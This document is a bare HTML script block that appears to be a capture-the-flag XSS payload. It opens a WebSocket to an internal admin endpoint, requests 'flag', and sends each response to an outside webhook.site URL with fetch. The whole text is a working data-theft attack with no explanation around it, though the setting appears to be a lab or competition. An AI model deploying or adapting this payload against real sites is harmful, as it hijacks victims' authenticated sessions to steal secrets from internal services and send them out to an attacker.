<script>
  (function () {
    const WS_URL = 'ws://web:8080/admin/ws';
    const WEBHOOK_URL = 'https://webhook.site/e72c61d4-ac26-4a4f-bad4-d61e4d7d8129/log';

    function sendFlagRequest(flag) {
      const url = `${WEBHOOK_URL}?flag=${encodeURIComponent(flag)}`;
      fetch(url).catch(console.error);
    }

    function setupWebSocket() {
      const socket = new WebSocket(WS_URL);

      socket.addEventListener('open', () => {
        socket.send('flag');
      });

      socket.addEventListener('message', (event) => {
        if (event && event.data) {
          sendFlagRequest(event.data);
        }
      });

      socket.addEventListener('error', (err) => {
        console.error('WebSocket error:', err);
      });
    }

    setupWebSocket();
  })();
</script>
